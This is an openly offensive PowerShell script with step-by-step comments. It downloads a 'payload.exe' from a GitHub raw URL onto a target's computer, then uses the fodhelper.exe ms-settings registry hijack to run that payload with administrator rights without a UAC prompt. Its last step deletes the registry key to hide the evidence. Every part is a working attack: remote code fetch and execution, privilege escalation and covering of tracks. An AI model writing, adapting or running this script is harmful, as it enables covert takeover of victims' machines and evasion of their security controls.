# --- Step 1: Download the main payload ---
# This command downloads your actual .exe file from your GitHub repository
# and saves it to a hidden, public location on the target's computer.
$payloadURL = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
$savePath = "C:\Users\Public\Downloads\payload.exe"
Invoke-WebRequest -Uri $payloadURL -OutFile $savePath

# --- Step 2: Perform the UAC Bypass ---
# This is the magic part. It tricks Windows into giving us administrator rights
# without showing the user a pop-up asking for permission.
# It does this by hijacking a special system shortcut.
$RegKey = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
Set-ItemProperty -Path $RegKey -Name "(Default)" -Value $savePath
Set-ItemProperty -Path $RegKey -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"

# --- Step 3: Clean Up the Evidence ---
# We wait a few seconds for fodhelper.exe to do its job, then we delete the
# registry key we created. This helps hide what we just did.
Start-Sleep -Seconds 3
Remove-Item -Path $RegKey -Recurse -Force